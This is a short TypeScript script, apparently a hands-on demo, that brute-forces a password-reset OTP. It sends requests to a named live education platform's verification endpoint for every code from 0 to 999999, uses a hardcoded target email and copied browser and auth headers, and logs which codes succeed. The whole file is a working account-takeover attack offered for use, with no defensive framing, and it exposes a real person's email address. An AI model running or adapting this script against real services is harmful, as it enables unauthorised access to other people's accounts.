import axios from "axios";

async function attackNow({email, otp, newPassword}: {email: string, otp: string, newPassword: string}) {
    let data = JSON.stringify({
        email,
        otp,
        newPassword
    });


        let config = {
        method: 'get',
        maxBodyLength: Infinity,
        url: `https://harkiratapi.classx.co.in/get/otpverify?useremail=sahiltiwaskar2003%40gmail.com&otp=${otp}`,
        headers: { 
            'accept': '*/*', 
            'accept-language': 'en-GB,en;q=0.8', 
            'auth-key': 'appxapi', 
            'client-service': 'Appx', 
            'device-type': '', 
            'origin': 'https://harkirat.classx.co.in', 
            'priority': 'u=1, i', 
            'referer': 'https://harkirat.classx.co.in/', 
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"', 
            'sec-ch-ua-mobile': '?1', 
            'sec-ch-ua-platform': '"Android"', 
            'sec-fetch-dest': 'empty', 
            'sec-fetch-mode': 'cors', 
            'sec-fetch-site': 'same-site', 
            'sec-gpc': '1', 
            'source': 'website', 
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36'
        }
        };

      try {
        await axios.request(config)
        console.log("done for " + otp);
      } catch(e) {
        // @ts-ignore
        console.log(e.response.data);
        console.log("failed for " + otp);
      }
}

async function main() {
    for(let i = 0; i < 999999; i+=100) {
        let p = [];
        for (let j = 0; j < 100; j++) {
            p.push(await attackNow({
                email: "sahil@gmail.com",
                otp: (i+j).toString(),
                newPassword: "Newpassword"
            }))
        }
        await Promise.all(p);
    }
}

main()